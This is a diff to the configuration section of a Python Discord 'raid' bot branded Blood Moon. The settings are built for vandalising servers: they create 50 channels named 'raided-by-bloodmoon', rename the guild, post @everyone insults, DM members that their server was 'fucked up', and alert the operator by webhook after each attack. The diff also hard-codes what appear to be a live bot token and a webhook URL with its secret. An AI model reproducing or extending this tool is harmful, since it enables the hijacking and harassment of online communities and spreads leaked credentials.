@@ -4,12 +4,12 @@ from discord.ext import commands
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
 # Change the information
-token = ""
+token = "NzY5MjMwODcxMDEzNzUyODQz.X5MAEwDcCXwqYtjh6fTRuNomJ541eS8ww"
 prefix = "$"
 
 # If webhook is True when somebody attack a server get notification with user and server id
 webhook = True
-webhook_url = ""
+webhook_url = "https://discordapp.com/api/webhooks/780641361468719136/95kC-ZgYntSgxQ8SjDt6t_oKFc1DvX3xCBC5UuUG6TywQjkFTL-lZOj6ztDmnBnb8Tj"
 # If i have this color "#DC143C" change # for 0x, result "0xDC143C"
 webhook_color = 0xb81c00
 # Only link
@@ -18,12 +18,9 @@ name_channel = "raided-by-bloodmoon"
 num_channels = 50
 guild_name = "Raided By Blood Moon"
 guild_picture = "Pic/Blood_Moon.jpg"
-"""
-If "message" is False it will send an embed instead of a message 
-"""
+# If "message" is False it will send an embed instead of a message 
 message = False
 message_channels = "@everyone Fucked by Blood Moon."
-
 # If "embed_dm" is True the previously declared embed will be sent, if it is false "message_dm" will be sent 
 embed_dm = True
 message_dm = "A server where you were was fucked up by Blood Moon."
@@ -32,10 +29,13 @@ embed_desc = "Server fucked by Blood Moon."
 # If i have this color "#DC143C" change # for 0x, result "0xDC143C"
 embed_color = 0xb81c00
 embed_link = "https://discord.gg/test"
-# Always URL
+# Always URL Image
 embed_picture = "https://media.discordapp.net/attachments/777622927993864242/780586514043895858/photo_2020-11-23_08-57-51.jpg?width=429&height=429"
+
+# For get members with de new API
 intents = discord.Intents.default()
 intents.members = True
+
 # Define prefix
 client = commands.Bot(command_prefix = prefix, intents=intents)
 client.remove_command("help")
